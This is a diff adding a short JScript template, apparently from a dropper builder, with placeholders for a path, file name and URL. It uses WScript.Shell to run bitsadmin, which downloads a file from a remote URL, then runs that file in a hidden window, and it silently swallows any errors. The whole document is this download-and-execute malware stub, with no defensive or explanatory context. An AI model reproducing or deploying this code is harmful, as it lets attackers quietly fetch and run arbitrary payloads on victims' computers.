@@ -1,0 +1,7 @@
+try {
+var file = "%pathh%" + "\\%filename%";
+new ActiveXObject("WScript.Shell").run('bitsadmin.exe /transfer 8 %url% ' + file,0, true)
+new ActiveXObject("WScript.Shell").run(file)
+}
+catch (e) {
+}
